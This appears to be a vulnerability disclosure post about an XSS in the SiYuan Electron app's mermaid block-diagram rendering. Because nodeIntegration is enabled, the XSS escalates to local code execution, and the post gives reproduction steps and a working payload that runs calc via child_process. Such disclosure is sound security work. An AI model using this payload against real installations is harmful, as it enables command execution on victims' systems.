---
layout: post
title:  "XSS in Siyuan Electron App when rendering mermaid block diagram Leading to RCE"
date:  2024-06-04 10:31:06 +0800
categories: xss
---


### Summary
Due to outdated mermaid 10.8.0 is used to render block diagrams, a XSS in block diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims local system.

### Details
Siyuan is using [mermaid 10.8.0](https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30) to render mermaid diagram. However, [the test html](https://github.com/mermaid-js/mermaid/blob/d6ccd93cf207a30bbd45edf39fd29afdbb87b05e/cypress/platform/xss25.html#L98) in mermaid repo showed that the edge label names of [new block diagram](https://github.com/mermaid-js/mermaid/pull/5221) is not sanitized and could lead to XSS. The name of node is not fully sanitized which leads to  injection of XSS payload. 

Besides, the electron app sets `nodeIntegration` to [`true`](https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/electron/main.js#L305) which is harmful, according to [this attack](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/electron-desktop-apps#introduction), a XSS can be escalated to execute command on victims' local system.

### PoC

1. Download latest Siyuan-3.0.17 windows electron app from [official site](https://release.liuyun.io/siyuan/siyuan-3.0.17-win.exe), and install the application:

2. Create new document, and type `/Mermaid` command to insert mermaid diagram using following payload:
  ```
  block-beta
  `A-- "X<img src=x onerror=require('child_process').exec('calc');>" -->B
  ```
2. The calculator poped up.

    ![rce](/assets/images/mermaid/siyuan-rce.png)

### Impact

Client side code execution. 


### Reference

[https://github.com/siyuan-note/siyuan/issues/11645](https://github.com/siyuan-note/siyuan/issues/11645)

[https://github.com/mermaid-js/mermaid/blob/d6ccd93cf207a30bbd45edf39fd29afdbb87b05e/cypress/platform/xss25.html#L98](https://github.com/mermaid-js/mermaid/blob/d6ccd93cf207a30bbd45edf39fd29afdbb87b05e/cypress/platform/xss25.html#L98)

### Occurence

[https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/electron/main.js#L305](https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/electron/main.js#L305)

[https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30](https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30)
